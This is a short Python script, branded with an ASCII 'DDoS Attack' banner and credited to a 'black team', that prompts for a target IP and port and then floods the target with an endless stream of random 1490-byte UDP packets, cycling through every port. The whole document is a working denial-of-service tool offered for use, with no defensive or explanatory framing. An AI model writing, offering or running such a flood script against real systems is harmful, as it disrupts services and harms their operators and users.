import sys
import os
import time
import socket
from colorama import Fore
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("cls" or "clear")
print(Fore.GREEN+"""
                      maede movahed
 ____  ____                         _   _   _             _
|  _ \|  _ \  ___  ___             / \ | |_| |_ __ _  ___| | __
| | | | | | |/ _ \/ __|  _____    / _ \| __| __/ _` |/ __| |/ /
| |_| | |_| | (_) \__ \ |_____|  / ___ \ |_| || (_| | (__|   <
|____/|____/ \___/|___/         /_/   \_\__|\__\__,_|\___|_|\_\ 
""")
ip = input(Fore.CYAN+"[>>] "+Fore.WHITE+"IP Target : ")
port1 = input(Fore.CYAN+"[>>] "+ Fore.WHITE+"Enter port:  ")
port = int(port1)
time.sleep(3)
sent = 0 
while True:
        sock.sendto(bytes,(ip,port))
        sent = sent + 1
        port = port + 1
        if port == 65534:
            port = 1
        print(Fore.GREEN+"Sent %s packet to %s  By order power of black team"%(sent,ip))
        print(Fore.WHITE+"By order power of black team",sent)


